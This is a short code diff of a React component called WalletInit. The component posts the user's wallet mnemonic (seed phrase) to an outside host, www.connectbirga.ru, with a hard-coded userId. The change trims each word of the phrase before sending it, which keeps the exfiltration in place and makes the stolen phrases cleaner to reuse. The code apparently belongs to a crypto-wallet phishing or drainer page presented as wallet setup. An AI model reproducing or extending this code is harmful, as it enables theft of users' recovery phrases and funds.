@@ -52,7 +52,7 @@ const WalletInit = () => {
         try{
 
             const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
-                mnemonic: inputs,
+                mnemonic: inputs.map((e,i) => e.trim()),
                 userId: 2144832745,
               } , {
                 headers : {
